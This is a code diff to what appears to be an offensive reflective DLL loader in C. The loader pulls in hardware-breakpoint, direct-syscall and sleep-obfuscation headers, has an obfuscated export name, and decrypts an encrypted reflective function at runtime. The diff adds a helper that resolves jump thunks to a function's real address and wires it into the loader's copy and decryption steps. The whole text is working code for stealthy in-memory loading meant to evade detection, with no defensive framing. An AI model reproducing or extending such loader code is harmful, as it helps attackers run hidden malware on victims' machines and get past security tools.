@@ -4,6 +4,7 @@
 #include "hwbp.h"
 #include "syscalls.h"
 #include "sleaping.h"
+#include <stdint.h>
 
 typedef struct _SAC_DLL_HEADER
 {
@@ -13,6 +14,39 @@ typedef struct _SAC_DLL_HEADER
 	PBYTE to_free;
 
 } SAC_DLL_HEADER, *PSAC_DLL_HEADER;
+
+uintptr_t resolve_jmp_to_actual_function(void* func_addr)
+{
+	if (!func_addr) return 0;
+
+	PBYTE code = (PBYTE)func_addr;
+
+	// relative jmp
+	if (code[0] == 0xE9)
+	{
+		int32_t relative_offset = *(int32_t*)(code + 1);
+
+		void* next_instruction = (void*)((uintptr_t)func_addr + 5);
+		void* actual_function = (void*)((uintptr_t)next_instruction + relative_offset);
+
+		return (uintptr_t)actual_function;
+	}
+
+	// indirect jmp
+	if (code[0] == 0xff && code[1] == 0x25)
+	{
+		// x64: FF 25 [32bits relative offset]
+		uint32_t relative_offset = *(int32_t*)(code + 2);
+		// 6 = FF25(2) + offset(4)
+		void* import_table_addr = (void*)((uintptr_t)func_addr + 6 + relative_offset);
+
+		void* actual_function = *(void**)import_table_addr;
+
+		return (uintptr_t)actual_function;
+	}
+
+	return (uintptr_t)func_addr;
+}
 
 EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 {
@@ -297,7 +331,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 			(PVOID)(pebase + pe_sections[i]->VirtualAddress),
 			(PVOID)(reflective_dll_base + pe_sections[i]->PointerToRawData),
 			pe_sections[i]->SizeOfRawData,
-			(PBYTE)(ReflectiveFunction),
+			(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
 			dll_hdr->funcSize
 		);
 	}
@@ -557,7 +591,7 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 		(BYTE)((p_dll_header->key >> 24) & 0xFF),
 	};
 
-	reflective_addr = (PBYTE)ReflectiveFunction;
+	reflective_addr = (PBYTE)resolve_jmp_to_actual_function( ReflectiveFunction );
 
 	// decrypting the reflective function
 	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
